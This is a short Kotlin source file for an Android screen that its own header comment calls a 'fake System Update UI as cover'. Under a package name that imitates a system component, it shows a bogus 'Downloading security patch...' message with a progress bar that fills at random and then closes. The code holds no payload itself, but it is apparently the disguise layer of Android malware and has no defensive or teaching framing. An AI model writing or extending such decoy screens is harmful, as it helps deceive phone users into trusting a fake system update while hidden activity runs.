// [context: Kotlin, Android API 26+, fake System Update UI as cover]
package com.system.service.ui

import android.app.Activity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import android.widget.TextView
import android.view.View

class DecoyActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // programmatic layout — no resource dependency
        val root = android.widget.LinearLayout(this).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(64, 128, 64, 64)
            setBackgroundColor(android.graphics.Color.WHITE)
        }
        val title = TextView(this).apply {
            text = "System Update"
            textSize = 22f
            setTextColor(android.graphics.Color.BLACK)
        }
        val sub = TextView(this).apply {
            text = "Downloading security patch..."
            textSize = 14f
            setTextColor(android.graphics.Color.DKGRAY)
        }
        val pb = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100; progress = 0
        }
        root.addView(title); root.addView(sub); root.addView(pb)
        setContentView(root)

        // fake progress then close
        var p = 0
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                p += (3..8).random()
                if (p >= 100) { pb.progress = 100; handler.postDelayed({ finish() }, 500) }
                else { pb.progress = p; handler.postDelayed(this, 300) }
            }
        }
        handler.postDelayed(runnable, 500)
    }
}
